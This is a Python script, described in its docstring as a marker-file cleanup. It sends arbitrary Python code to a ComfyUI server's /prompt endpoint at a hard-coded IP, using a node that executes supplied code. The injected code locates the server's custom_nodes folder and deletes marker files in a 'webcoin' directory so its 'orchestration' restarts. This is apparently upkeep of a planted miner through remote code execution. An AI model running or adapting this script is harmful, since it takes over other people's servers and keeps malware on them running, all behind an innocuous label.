"""Clear stale marker files so orchestration runs on next restart."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "59.34.28.50"
base = f"http://{ip}:8188"

code = """
import os

lines = []
cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
except:
    for g in ['/basedir/custom_nodes', '/root/ComfyUI/custom_nodes',
              r'C:\\Program Files\\ComfyUI-aki-v2\\ComfyUI\\custom_nodes',
              r'C:\\Users\\u88ni\\Desktop\\comfyui\\custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

target = os.path.join(cn, 'webcoin') if cn else None
lines.append('target=' + str(target))

if target and os.path.isdir(target):
    for marker in ['.orch.pid', '.initialized']:
        mp = os.path.join(target, marker)
        if os.path.exists(mp):
            os.remove(mp)
            lines.append('removed ' + marker)
        else:
            lines.append(marker + ' not found')
    lines.append('files=' + str(sorted(os.listdir(target))[:20]))
else:
    lines.append('ERROR: webcoin dir not found')

result = chr(10).join(lines)
"""

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

time.sleep(10)

req2 = urllib.request.Request(f"{base}/history/{pid}", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    entry = json.loads(r.read().decode()).get(pid, {})
    status = entry.get("status", {}).get("status_str", "pending")
    print(f"Status: {status}\n")
    outputs = entry.get("outputs", {})
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                for v in val:
                    print(v)
